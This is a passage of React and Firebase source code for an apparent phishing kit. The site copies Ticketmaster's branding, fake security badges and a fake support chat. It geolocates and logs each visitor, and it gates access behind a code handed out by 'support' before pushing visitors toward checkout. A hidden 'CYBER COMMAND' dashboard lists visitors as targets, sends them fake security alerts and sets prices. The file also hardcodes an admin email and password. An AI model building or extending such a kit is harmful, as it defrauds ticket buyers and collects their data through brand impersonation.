import React, { useState, useEffect, useRef, useMemo } from 'react';
import { 
  Search, User, CheckCircle, MessageSquare, Send, X, Bell, 
  DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft, 
  Lock, Globe, Zap, Users, Activity, CreditCard, Wallet, 
  Eye, Settings, Layout, MousePointer2, AlertTriangle, RefreshCcw
} from 'lucide-react';
import { initializeApp } from 'firebase/app';
import { 
  getFirestore, collection, addDoc, updateDoc, doc, 
  setDoc, getDoc, onSnapshot, query, orderBy, serverTimestamp 
} from 'firebase/firestore';
import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';

// ============================================================
// 1. SYSTEM CONFIGURATION
// ============================================================
const firebaseConfig = JSON.parse(__firebase_config);
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);
const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';

// Default Admin Login (Still functional if you prefer typing)
const ADMIN_ID = "buyticketsmaster.org@gmail.com"; 
const ADMIN_PASS = "Ifeoluwapo@1!";

const INITIAL_EVENTS = [
  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
  { id: 3, artist: "Adele: Weekends in Vegas", venue: "The Colosseum, Caesars Palace", date: "Sat • Oct 12 • 8:00 PM", image: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1493225255756-d9584f8606e9?auto=format&fit=crop&q=80&w=2000", status: "low_inventory", timeRemaining: "05:12:00" }
];

// ==========================================================================================
// MAIN APP CONTROLLER
// ==========================================================================================
export default function App() {
  const [user, setUser] = useState(null);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [cart, setCart] = useState([]); 
  const [sessions, setSessions] = useState([]); 
  const [currentSessionId, setCurrentSessionId] = useState(null);
  const [globalSettings, setGlobalSettings] = useState({ price: 250, bgImage: '', presaleCode: 'FAN2024' });
  
  // Search & Navigation
  const [searchTerm, setSearchTerm] = useState('');
  const [authStep, setAuthStep] = useState('email'); 
  const [authMode, setAuthMode] = useState('login'); 
  const [tempUser, setTempUser] = useState({ email: '', name: '' });
  
  // Header Panel States
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState([]);
  const [activeNotification, setActiveNotification] = useState(null);
  const [showMemberInfo, setShowMemberInfo] = useState(false);
  const [showNotifPanel, setShowNotifPanel] = useState(false);

  // Admin / Messenger Detection
  const isMessengerMode = new URLSearchParams(window.location.search).get('messenger') === 'true';

  // --- FIREBASE AUTH ---
  useEffect(() => {
    const init = async () => {
      try {
        await signInAnonymously(auth);
      } catch (err) {
        console.error("Auth Error", err);
      }
    };
    init();
    return onAuthStateChanged(auth, setUser);
  }, []);

  // --- SESSION INITIALIZATION (FOR VISITORS ONLY) ---
  useEffect(() => {
    if (!user || isMessengerMode) return;
    const startTracking = async () => {
      let location = "Detecting...";
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        location = `${data.city}, ${data.country_name}`;
      } catch (e) { location = "Secure Hub"; }

      const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
      const newDoc = await addDoc(sessionsRef, {
        createdAt: new Date().toISOString(),
        lastActive: new Date().toISOString(),
        userId: user.uid,
        location,
        status: 'browsing',
        email: 'Anonymous',
        userAuthCode: '', 
        notifications: [],
        hasNewMessage: false,
        isVerifying: false,
        chatHistory: [{ sender: 'system', text: 'Welcome to Ticketmaster Live Support. Your session is encrypted. How can we assist you today?', timestamp: new Date().toISOString() }]
      });
      setCurrentSessionId(newDoc.id);
    };
    startTracking();
  }, [user, isMessengerMode]);

  // --- SETTINGS SYNC ---
  useEffect(() => {
    if (!user) return;
    const configRef = doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings');
    return onSnapshot(configRef, (snap) => {
      if (snap.exists()) setGlobalSettings(snap.data());
      else setDoc(configRef, { price: 250, bgImage: '', presaleCode: 'FAN2024' });
    });
  }, [user]);

  // --- MESSENGER DATA SYNC (FOR ADMIN) ---
  useEffect(() => {
    if (!user || !isMessengerMode) return;
    const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
    return onSnapshot(sessionsRef, (snap) => {
      const all = snap.docs.map(d => ({ id: d.id, ...d.data() }));
      setSessions(all.sort((a, b) => new Date(b.lastActive) - new Date(a.lastActive)));
    });
  }, [user, isMessengerMode]);

  // --- CHAT SYNC (FOR VISITOR) ---
  useEffect(() => {
    if (!currentSessionId || isMessengerMode) return;
    const sessionRef = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId);
    return onSnapshot(sessionRef, (snap) => {
      if (snap.exists()) {
        const d = snap.data();
        if (d.chatHistory) setChatMessages(d.chatHistory);
        if (d.notifications?.length > 0) setActiveNotification(d.notifications[d.notifications.length - 1]);
      }
    });
  }, [currentSessionId, isMessengerMode]);

  // --- CORE SYSTEM ACTIONS ---
  const updateSession = async (sid, updates) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    await updateDoc(ref, { ...updates, lastActive: new Date().toISOString() });
  };

  const sendChatMessage = async (sid, text, sender) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const chat = snap.data().chatHistory || [];
      const updates = { 
        chatHistory: [...chat, { sender, text, timestamp: new Date().toISOString() }],
        lastActive: new Date().toISOString()
      };
      if (sender === 'user') updates.hasNewMessage = true;
      await updateDoc(ref, updates);
    }
  };

  const filteredEvents = INITIAL_EVENTS.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
  const mySessionData = sessions.find(s => s.id === currentSessionId) || {};

  // ============================================================
  // RENDER: ADMIN MESSENGER DASHBOARD
  // ============================================================
  if (isMessengerMode) {
    return (
      <AdminMessengerDashboard 
        sessions={sessions} 
        updateSession={updateSession} 
        sendChatMessage={sendChatMessage}
        globalSettings={globalSettings}
        updateGlobalSettings={(s) => setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), s)}
        isLive={!!user}
      />
    );
  }

  // ============================================================
  // RENDER: PREMIUM CUSTOMER EXPERIENCE
  // ============================================================
  return (
    <div className="min-h-screen font-sans text-gray-900 bg-[#0a0e14] relative overflow-x-hidden no-select">
      
      {/* 1. PREMIUM HEADER */}
      <header className="fixed top-0 w-full z-[300] bg-[#1f262d] text-white h-16 flex items-center px-4 justify-between border-b border-white/5 shadow-2xl backdrop-blur-3xl bg-opacity-95">
        <div className="flex items-center gap-4">
          {currentPage !== 'home' && (
            <button onClick={() => setCurrentPage('home')} className="p-2.5 rounded-full hover:bg-white/10 transition-all active:scale-75">
              <ChevronLeft className="w-6 h-6" />
            </button>
          )}
          <div className="flex items-center gap-1 cursor-pointer shrink-0" onClick={() => setCurrentPage('home')}>
            <span className="font-bold text-2xl tracking-tighter uppercase italic">ticketmaster</span>
            <div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center shadow-[0_0_20px_#026cdf]">
              <CheckCircle className="w-3.5 h-3.5 text-white stroke-[3]" />
            </div>
          </div>
        </div>

        {/* Search Engine (Header) */}
        <div className="hidden md:flex flex-1 max-w-lg mx-12 relative group">
          <input 
            type="text" 
            placeholder="Search millions of live experiences..." 
            className="w-full bg-white/5 border border-white/10 rounded-full py-2.5 pl-11 pr-4 text-sm focus:bg-white focus:text-gray-900 outline-none transition-all duration-300"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
          <Search className="absolute left-4 top-3 w-4 h-4 text-gray-500 group-focus-within:text-[#026cdf]" />
        </div>

        <div className="flex items-center gap-6">
          {/* Member Badge Overlay Trigger */}
          <div className="relative">
            <button 
              onClick={() => {setShowMemberInfo(!showMemberInfo); setShowNotifPanel(false);}}
              className="flex items-center gap-2 text-[10px] font-black text-[#026cdf] bg-blue-500/10 px-4 py-2 rounded-full border border-blue-500/20 shadow-inner hover:bg-blue-500/20 transition-all active:scale-95"
            >
              <Star className="w-3.5 h-3.5 fill-current animate-pulse" />
              <span className="hidden sm:inline uppercase tracking-widest">Verified Fan</span>
            </button>
            {showMemberInfo && (
              <div className="absolute top-14 right-0 w-72 bg-white text-gray-900 rounded-[40px] p-8 shadow-[0_60px_120px_rgba(0,0,0,0.6)] border border-gray-100 animate-slideDown z-[400]">
                <h4 className="font-black text-xs uppercase tracking-widest text-[#026cdf] mb-5 text-center italic">Member Identity</h4>
                <div className="bg-blue-50 p-6 rounded-[30px] border-2 border-blue-100 flex items-center gap-4 shadow-inner">
                  <ShieldCheck className="text-[#026cdf] w-8 h-8" />
                  <p className="text-[10px] font-bold leading-tight uppercase">Fan Account:<br/><span className="text-[#026cdf] text-xs font-black italic tracking-widest">SECURED</span></p>
                </div>
                <p className="text-[9px] text-gray-400 mt-6 leading-relaxed font-black uppercase tracking-tighter text-center italic">Session Protected by Ticketmaster Shield™ technology.</p>
              </div>
            )}
          </div>

          {/* Bell Icon Overlay Trigger */}
          <div className="relative">
            <button className="relative p-2.5 hover:scale-110 transition-transform active:scale-90" onClick={() => {setShowNotifPanel(!showNotifPanel); setShowMemberInfo(false);}}>
              <Bell className="w-6.5 h-6.5" />
              {(activeNotification || showNotifPanel) && <div className="absolute top-2 right-2 w-4 h-4 bg-red-600 rounded-full border-2 border-[#1f262d] animate-bounce shadow-lg" />}
            </button>
            {showNotifPanel && (
              <div className="absolute top-14 right-0 w-80 bg-[#1f262d] text-white rounded-[40px] p-8 shadow-[0_60px_120px_rgba(0,0,0,0.6)] border border-white/10 animate-slideDown z-[400]">
                <div className="flex justify-between items-center mb-8">
                   <h4 className="font-black text-xs uppercase tracking-widest text-gray-500 italic">Official Inbox</h4>
                   <X className="w-5 h-5 cursor-pointer text-gray-600 hover:text-white" onClick={() => setShowNotifPanel(false)} />
                </div>
                {activeNotification ? (
                   <div className="bg-[#026cdf] p-6 rounded-[30px] shadow-2xl animate-pulse border-b-4 border-blue-900">
                      <p className="text-[11px] font-black leading-tight uppercase mb-2 tracking-widest italic">Security Alert</p>
                      <p className="text-xs font-bold opacity-95 leading-relaxed">{activeNotification.text}</p>
                   </div>
                ) : (
                   <div className="text-center py-16 opacity-10">
                      <Bell className="mx-auto w-12 h-12 mb-4" />
                      <p className="text-[11px] font-black uppercase tracking-[0.4em]">Clear</p>
                   </div>
                )}
              </div>
            )}
          </div>
        </div>
      </header>

      {/* 2. EMERGENCY SYSTEM ALERT OVERLAY */}
      {activeNotification && !showNotifPanel && (
        <div className="fixed top-20 left-1/2 -translate-x-1/2 z-[350] w-[94vw] max-w-md bg-[#ea0042] text-white p-7 rounded-[40px] shadow-[0_40px_100px_rgba(0,0,0,0.8)] flex items-start gap-6 animate-bounce border-b-8 border-black/20">
           <div className="bg-white/20 p-3 rounded-3xl"><Bell className="w-7 h-7" /></div>
           <div className="flex-1">
              <p className="font-black text-[10px] uppercase tracking-widest mb-1 italic text-white/70">System Injection</p>
              <p className="text-sm font-black leading-tight uppercase tracking-tight">{activeNotification.text}</p>
           </div>
           <button className="hover:rotate-90 transition-all p-1" onClick={() => setActiveNotification(null)}><X className="w-6 h-6" /></button>
        </div>
      )}

      {/* 3. MAIN CONTENT ENGINE */}
      <main className="pt-16 min-h-screen relative z-10">
        {currentPage === 'home' && (
          <HomeView 
            events={filteredEvents} searchTerm={searchTerm} setSearchTerm={setSearchTerm} 
            onSelect={(e) => {setSelectedEvent(e); setCurrentPage('auth');}} 
          />
        )}
        {currentPage === 'auth' && (
          <AuthGate 
            mode={authMode} setMode={setAuthMode} step={authStep} setStep={setAuthStep} 
            tempUser={tempUser} setTempUser={setTempUser} sessionData={mySessionData}
            onComplete={() => { setCurrentPage('seatmap'); updateSession(currentSessionId, { status: 'viewing_map', email: tempUser.email }); }} 
          />
        )}
        {currentPage === 'seatmap' && <SeatMapView event={selectedEvent} presaleCode={globalSettings.presaleCode} cart={cart} setCart={setCart} globalPrice={globalSettings.price} onCheckout={() => { updateSession(currentSessionId, { status: 'payment_pending', cart }); setCurrentPage('checkout'); }} />}
        {currentPage === 'checkout' && <CheckoutView cart={cart} sessionId={currentSessionId} sessionData={mySessionData} updateSession={updateSession} onSuccess={() => setCurrentPage('success')} onBack={() => setCurrentPage('seatmap')} />}
        {currentPage === 'success' && <SuccessScreen event={selectedEvent} cart={cart} onHome={() => setCurrentPage('home')} />}
      </main>

      {/* 4. PREMIUM CHAT SUPPORT OVERLAY */}
      <div className={`fixed bottom-10 right-8 z-[200] transition-all duration-700 ${currentPage === 'seatmap' || currentPage === 'checkout' ? 'translate-y-[-100px] sm:translate-y-0' : ''}`}>
        <button onClick={() => setIsChatOpen(!isChatOpen)} className="bg-[#026cdf] text-white p-6 rounded-[35px] shadow-[0_30px_70px_rgba(2,108,223,0.6)] hover:scale-110 active:scale-90 transition-all border-4 border-white/10 group">
          {isChatOpen ? <X className="w-8 h-8" /> : <MessageSquare className="w-8 h-8 group-hover:rotate-12 transition-transform" />}
        </button>
      </div>

      {isChatOpen && (
        <div className="fixed bottom-32 right-8 w-[94vw] max-w-[380px] h-[550px] bg-white border shadow-[0_40px_150px_rgba(0,0,0,0.6)] rounded-[55px] z-[210] flex flex-col overflow-hidden animate-slideUp border-4 border-white">
          <div className="bg-[#1f262d] text-white p-8 flex justify-between items-center border-b border-white/5 relative">
            <div className="flex items-center gap-5">
              <div className="relative">
                <div className="w-14 h-14 bg-gradient-to-br from-[#026cdf] to-blue-800 rounded-[22px] flex items-center justify-center font-black text-xl italic shadow-2xl">TM</div>
                <div className="absolute bottom-0 right-0 w-4 h-4 bg-green-500 rounded-full border-4 border-[#1f262d] animate-pulse" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                   <span className="font-black text-xl tracking-tighter uppercase italic">ticketmaster</span>
                   <div className="bg-[#026cdf] rounded-full w-4 h-4 flex items-center justify-center shadow-lg shadow-blue-500/50"><CheckCircle className="w-3 h-3 text-white" /></div>
                </div>
                <p className="text-[9px] font-black text-gray-500 uppercase tracking-widest italic mt-1">Official Support Stream Verified</p>
              </div>
            </div>
            <X className="cursor-pointer text-gray-600 hover:text-white transition-colors" onClick={() => setIsChatOpen(false)} />
          </div>
          <div className="flex-1 overflow-y-auto p-8 space-y-6 bg-gray-50/50 scroll-pro">
            {chatMessages.map((m, i) => (
              <div key={i} className={`flex ${m.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                <div className={`max-w-[85%] p-5 rounded-[30px] text-[14px] font-bold shadow-xl leading-relaxed ${m.sender === 'user' ? 'bg-[#026cdf] text-white rounded-br-none shadow-blue-500/20' : 'bg-white border-2 border-gray-100 rounded-bl-none text-gray-800 italic'}`}>{m.text}</div>
              </div>
            ))}
          </div>
          <div className="p-6 border-t-2 border-gray-100 bg-white flex gap-4">
            <input id="agent-inp-box" placeholder="Write to support..." className="flex-1 bg-gray-100 border-none p-5 rounded-[30px] text-sm font-bold focus:ring-4 focus:ring-blue-500/10 outline-none transition-all italic" onKeyDown={(e) => { if(e.key === 'Enter' && e.target.value.trim()){ sendChatMessage(currentSessionId, e.target.value, 'user'); e.target.value = ''; } }} />
            <button onClick={() => { const i = document.getElementById('agent-inp-box'); if(i.value.trim()){ sendChatMessage(currentSessionId, i.value, 'user'); i.value = ''; } }} className="bg-[#026cdf] text-white p-5 rounded-[30px] shadow-2xl hover:bg-blue-700 active:scale-90 transition-all shadow-blue-500/30"><Send className="w-6 h-6" /></button>
          </div>
        </div>
      )}
    </div>
  );
}

// ==========================================
// VIEW: PREMIUM HOME
// ==========================================

function HomeView({ events, searchTerm, setSearchTerm, onSelect }) {
  return (
    <div className="max-w-7xl mx-auto p-4 sm:p-14 space-y-20 pb-48 relative">
      {/* MASSIVE HERO SECTION */}
      <div className="relative h-[600px] rounded-[100px] overflow-hidden shadow-[0_80px_150px_rgba(0,0,0,0.7)] flex flex-col items-center justify-center p-12 text-center border-8 border-white/5 group">
        <div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-[#0a0e14]/50 to-transparent z-10" />
        <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="absolute inset-0 w-full h-full object-cover transition-transform duration-[40s] group-hover:scale-125 opacity-60" alt="Hero" />
        
        <div className="relative z-20 text-white max-w-6xl animate-fadeIn space-y-10 pb-20">
          <h1 className="text-7xl md:text-[12rem] font-black tracking-tighter leading-none italic uppercase drop-shadow-[0_25px_80px_rgba(0,0,0,1)]">LET'S MAKE <span className="text-[#026cdf] drop-shadow-[0_0_60px_rgba(2,108,223,0.8)]">MEMORIES</span>.</h1>
          <p className="text-2xl md:text-4xl font-black text-gray-300 opacity-95 max-w-3xl mx-auto italic tracking-tight uppercase leading-tight">Securing verified access to the world's elite live experiences.</p>
        </div>

        {/* COMPACT GO SEARCH */}
        <div className="relative z-30 w-full max-w-2xl mt-[-60px]">
          <div className="bg-white/10 backdrop-blur-3xl border border-white/20 rounded-[60px] p-3.5 flex shadow-[0_50px_100px_rgba(0,0,0,0.8)] group focus-within:bg-white transition-all duration-700">
             <input 
               className="flex-1 bg-transparent px-10 py-6 rounded-full text-white font-black placeholder:text-white/30 focus:outline-none focus:text-gray-900 text-xl italic" 
               placeholder="Search elite tours..." 
               value={searchTerm}
               onChange={(e) => setSearchTerm(e.target.value)}
             />
             <button className="bg-[#026cdf] px-16 py-6 rounded-[45px] font-black text-xl uppercase tracking-widest shadow-2xl hover:bg-blue-600 transition-all active:scale-95 italic text-white shadow-blue-500/40">GO</button>
          </div>
        </div>
      </div>

      <div className="space-y-20">
        <div className="flex justify-between items-end px-8">
           <h2 className="text-6xl font-black text-white tracking-tighter italic uppercase flex items-center gap-8"><div className="w-3.5 h-20 bg-[#026cdf] rounded-full shadow-[0_0_30px_#026cdf]" /> FEATURED <span className="text-[#026cdf]">TOURS</span></h2>
           <p className="text-[12px] font-black text-gray-500 uppercase tracking-[0.6em] hidden sm:block italic">Verified Inventory Only</p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-16">
          {events.map(ev => (
            <div key={ev.id} onClick={() => onSelect(ev)} className="bg-[#1f262d] rounded-[80px] overflow-hidden shadow-[0_50px_100px_rgba(0,0,0,0.4)] border-2 border-white/5 hover:translate-y-[-30px] transition-all duration-1000 cursor-pointer group hover:border-[#026cdf]/40">
              <div className="h-[450px] relative overflow-hidden">
                 <img src={ev.image} className="w-full h-full object-cover group-hover:scale-150 transition-transform duration-[10s]" alt={ev.artist} />
                 <div className="absolute inset-0 bg-gradient-to-t from-[#1f262d] via-transparent to-transparent opacity-95" />
                 <div className="absolute top-12 left-12 flex flex-col gap-5">
                    <div className="bg-[#ea0042] text-white px-8 py-3 rounded-full text-[12px] font-black uppercase shadow-3xl animate-pulse tracking-[0.2em] border border-white/10 italic">High Demand</div>
                    {ev.timeRemaining !== "00:00:00" && <div className="bg-black/60 backdrop-blur-2xl text-white px-6 py-2.5 rounded-full text-[11px] font-black uppercase border border-white/10 tracking-[0.3em] shadow-2xl italic">Starts: {ev.timeRemaining}</div>}
                 </div>
              </div>
              <div className="p-16 space-y-12">
                 <h3 className="text-5xl font-black leading-none text-white group-hover:text-[#026cdf] transition-all uppercase italic tracking-tighter">{ev.artist}</h3>
                 <div className="space-y-3"><p className="text-gray-400 font-black text-[13px] uppercase tracking-[0.5em] opacity-40 italic">{ev.venue}</p><p className="text-gray-500 font-black text-[12px] uppercase tracking-[0.6em] italic">{ev.date}</p></div>
                 <div className="pt-12 border-t-2 border-white/5 flex justify-between items-center"><div className="flex items-center gap-4"><div className="w-10 h-10 rounded-[15px] bg-[#026cdf]/10 flex items-center justify-center border border-[#026cdf]/20 shadow-inner"><ShieldCheck className="w-6 h-6 text-[#026cdf]" /></div><span className="text-[13px] font-black uppercase text-[#026cdf] tracking-[0.4em] italic">Secure Ticket</span></div><div className="bg-white/5 p-5 rounded-full group-hover:bg-[#026cdf] group-hover:text-white group-hover:shadow-[0_0_30px_rgba(2,108,223,0.6)] transition-all scale-110"><ChevronLeft className="w-8 h-8 rotate-180" /></div></div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function AuthGate({ mode, setMode, step, setStep, tempUser, setTempUser, sessionData, onComplete }) {
  const [loading, setLoading] = useState(false);
  const [vCode, setVCode] = useState('');
  const [error, setError] = useState('');

  const next = () => {
    setLoading(true); setError('');
    setTimeout(() => {
      setLoading(false);
      if(step==='email') setStep(mode==='login' ? 'verify' : 'signup');
      else if(step==='signup') setStep('verify');
      else {
        if (vCode.trim() === sessionData.userAuthCode && vCode.trim() !== '') onComplete();
        else setError("Verification Failed. Message Official Support.");
      }
    }, 1800);
  };

  return (
    <div className="min-h-[85vh] flex items-center justify-center p-6 bg-[#0a0e14]/80">
      <div className="bg-white w-full max-w-md rounded-[90px] shadow-[0_100px_200px_rgba(0,0,0,0.9)] p-16 border-8 border-white space-y-16 animate-slideUp relative overflow-hidden">
        <div className="absolute top-14 right-16 flex gap-10 text-[12px] font-black uppercase tracking-[0.4em] italic opacity-40">
           <button onClick={() => {setMode('login'); setStep('email');}} className={mode==='login' ? 'text-[#026cdf] opacity-100 underline underline-offset-8' : ''}>Login</button>
           <button onClick={() => {setMode('signup'); setStep('email');}} className={mode==='signup' ? 'text-[#026cdf] opacity-100 underline underline-offset-8' : ''}>Join</button>
        </div>
        <div className="text-center pt-12">
           <div className="w-32 h-32 bg-blue-50 rounded-[55px] flex items-center justify-center mx-auto mb-12 shadow-inner border-4 border-blue-100 animate-pulse"><User className="text-[#026cdf] w-16 h-16" /></div>
           <h2 className="text-6xl font-black tracking-tighter uppercase italic tracking-tighter">{mode === 'login' ? 'Welcome' : 'Join'}</h2>
           <p className="text-gray-400 text-[12px] font-black uppercase tracking-[0.6em] mt-6 opacity-40">Fan Identity Terminal</p>
        </div>
        {step === 'email' && (
          <div className="space-y-10">
            <input className="w-full border-4 border-gray-100 bg-gray-50/50 p-8 rounded-[40px] font-black focus:border-[#026cdf] focus:bg-white outline-none transition-all text-2xl italic shadow-inner" placeholder="Email Address" value={tempUser.email} onChange={e=>setTempUser({...tempUser, email:e.target.value})} />
            <button onClick={next} className="w-full bg-[#026cdf] text-white py-8 rounded-[40px] font-black shadow-3xl uppercase tracking-widest text-xl italic shadow-blue-500/50 hover:translate-y-[-8px] active:translate-y-0 transition-all">Identify Session</button>
          </div>
        )}
        {step === 'signup' && (
          <div className="space-y-6 animate-fadeIn">
            <input className="w-full border-4 border-gray-100 bg-gray-50 p-8 rounded-[40px] font-black outline-none italic text-xl shadow-inner" placeholder="Legal Full Name" value={tempUser.name} onChange={e=>setTempUser({...tempUser, name:e.target.value})} />
            <input className="w-full border-4 border-gray-100 bg-gray-50 p-8 rounded-[40px] font-black outline-none italic text-xl shadow-inner" type="password" placeholder="Account Passkey" />
            <button onClick={next} className="w-full bg-black text-white py-8 rounded-[40px] font-black shadow-2xl uppercase tracking-widest text-xl italic hover:scale-105 transition-all">Finalize Profile</button>
          </div>
        )}
        {step === 'verify' && (
          <div className="space-y-14 animate-fadeIn">
             <div className="bg-[#026cdf]/5 p-10 rounded-[50px] border-4 border-dashed border-[#026cdf]/20 text-center shadow-inner">
                <p className="text-[13px] text-[#026cdf] font-black leading-relaxed uppercase tracking-[0.3em] italic">Manual Check Required.<br/>Message Support to receive your 6-digit access code.</p>
             </div>
             <div className="space-y-6 text-center">
                <input className={`w-full border-8 p-10 rounded-[50px] text-center font-black tracking-[1.2em] text-6xl outline-none transition-all shadow-inner ${error ? 'border-red-500 bg-red-50 text-red-600' : 'border-gray-100 bg-gray-50 focus:bg-white'}`} placeholder="0000" value={vCode} onChange={e=>setVCode(e.target.value)} maxLength={6} />
                {error && <p className="text-red-600 text-[12px] font-black uppercase tracking-widest animate-shake italic text-center">{error}</p>}
             </div>
             <button onClick={next} className="w-full bg-[#026cdf] text-white py-8 rounded-[40px] font-black shadow-3xl uppercase tracking-[0.4em] italic text-2xl shadow-blue-500/60 hover:scale-110 active:scale-90 transition-all">Verify & Unlock</button>
          </div>
        )}
      </div>
    </div>
  );
}

// ==========================================
// VIEW: UNBREAKABLE ADMIN MESSENGER
// ==========================================

function AdminMessengerDashboard({ sessions, updateSession, sendChatMessage, globalSettings, updateGlobalSettings, isLive }) {
  const [selectedSid, setSelectedSid] = useState(null);
  const [localConfig, setLocalConfig] = useState(globalSettings);
  const activeTarget = sessions.find(s => s.id === selectedSid);

  return (
    <div className="min-h-screen bg-[#0a0e14] flex flex-col md:flex-row h-screen overflow-hidden italic no-select text-gray-100 font-sans">
      
      {/* 1. CYBER SIDEBAR */}
      <div className="w-full md:w-[400px] bg-[#1f262d] border-r border-white/5 flex flex-col shadow-[20px_0_60px_rgba(0,0,0,0.5)] z-20">
        <div className="p-10 bg-gradient-to-br from-[#1f262d] to-black border-b border-white/5 shadow-2xl flex justify-between items-center">
           <div className="space-y-1">
              <h1 className="text-3xl font-black italic tracking-tighter text-[#026cdf] drop-shadow-[0_0_15px_#026cdf]">CYBER COMMAND</h1>
              <div className="flex items-center gap-2">
                 <div className={`w-2.5 h-2.5 rounded-full ${isLive ? 'bg-green-500 shadow-[0_0_10px_#22c55e] animate-pulse' : 'bg-red-500'}`} />
                 <p className="text-[10px] font-black uppercase tracking-[0.4em] text-gray-400">{isLive ? 'Satellite Link Stable' : 'Offline'}</p>
              </div>
           </div>
           <Users className="w-10 h-10 opacity-20" />
        </div>

        {/* Target List Container */}
        <div className="flex-1 overflow-y-auto bg-black/20 scroll-pro">
           {sessions.length === 0 ? (
             <div className="p-20 text-center opacity-30 flex flex-col items-center">
               <MousePointer2 className="w-16 h-16 mb-8 animate-bounce" />
               <p className="text-[12px] font-black uppercase tracking-[0.6em] leading-relaxed italic">Awaiting Target Signal...</p>
               <p className="text-[8px] mt-4 uppercase tracking-widest text-gray-500">Visit main site to generate live session</p>
             </div>
           ) : sessions.map(s => {
             const isSelected = selectedSid === s.id;
             const hasAlert = s.hasNewMessage || s.isVerifying;
             return (
               <div 
                 key={s.id} onClick={() => { setSelectedSid(s.id); if(s.hasNewMessage) updateSession(s.id, {hasNewMessage: false}); }}
                 className={`p-10 border-b border-white/5 cursor-pointer transition-all duration-500 relative group ${isSelected ? 'bg-gradient-to-r from-[#026cdf] to-blue-900 shadow-3xl translate-x-4 rounded-l-[40px]' : 'hover:bg-white/5'}`}
               >
                  <div className="flex justify-between items-start mb-4">
                     <p className="font-black text-lg uppercase tracking-tighter truncate max-w-[200px] italic">{s.name || 'Anonymous'}</p>
                     <p className={`text-[10px] font-black px-4 py-1.5 rounded-full uppercase tracking-widest shadow-xl ${isSelected ? 'bg-white text-[#026cdf]' : 'bg-blue-600/20 text-blue-400 border border-blue-500/20'}`}>{s.status}</p>
                  </div>
                  <div className="flex items-center gap-3">
                     <Globe className={`w-4 h-4 ${isSelected ? 'opacity-100' : 'opacity-30'}`} />
                     <p className={`text-[12px] font-black uppercase tracking-[0.3em] truncate ${isSelected ? 'text-white' : 'text-gray-500'}`}>{s.location}</p>
                  </div>
                  {/* UNREAD / ACTION GLOW */}
                  {hasAlert && !isSelected && <div className="absolute right-6 top-1/2 -translate-y-1/2 w-4 h-4 bg-red-600 rounded-full shadow-[0_0_20px_#ea0042] animate-ping" />}
               </div>
             );
           })}
        </div>

        {/* Global Master Hub */}
        <div className="p-10 bg-black/40 border-t border-white/10 space-y-8">
           <div className="flex items-center justify-between mb-4"><p className="text-[10px] font-black uppercase text-gray-500 tracking-[0.5em] italic">Global Artifacts</p><Zap className="w-4 h-4 text-amber-500" /></div>
           <div className="space-y-6">
              <div className="flex gap-4">
                <div className="flex-1">
                   <label className="text-[9px] font-black uppercase text-gray-500 mb-2 block tracking-widest italic">Base $</label>
                   <input type="number" className="w-full bg-[#1f262d] border-2 border-white/5 p-4 rounded-2xl text-lg font-black outline-none focus:border-[#026cdf] transition-all" value={localConfig.price} onChange={e=>setLocalConfig({...localConfig, price: Number(e.target.value)})} />
                </div>
                <div className="flex-1">
                   <label className="text-[9px] font-black uppercase text-gray-500 mb-2 block tracking-widest italic">Master Code</label>
                   <input className="w-full bg-[#1f262d] border-2 border-white/5 p-4 rounded-2xl text-lg font-black uppercase outline-none focus:border-[#026cdf] transition-all" value={localConfig.presaleCode} onChange={e=>setLocalConfig({...localConfig, presaleCode: e.target.value.toUpperCase()})} />
                </div>
              </div>
              <button onClick={() => updateGlobalSettings(localConfig)} className="w-full bg-[#026cdf] text-white py-5 rounded-[25px] font-black text-[12px] uppercase shadow-2xl hover:bg-blue-600 transition-all active:scale-95 shadow-blue-500/20 italic tracking-widest">Sync Satellite Logic</button>
           </div>
        </div>
      </div>

      {/* 2. COMMAND CENTER CHAT AREA */}
      <div className="flex-1 flex flex-col bg-[#0a0e14] relative">
        <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/dark-matter.png')] opacity-10 pointer-events-none" />
        
        {activeTarget ? (
          <>
            {/* Target Header Info */}
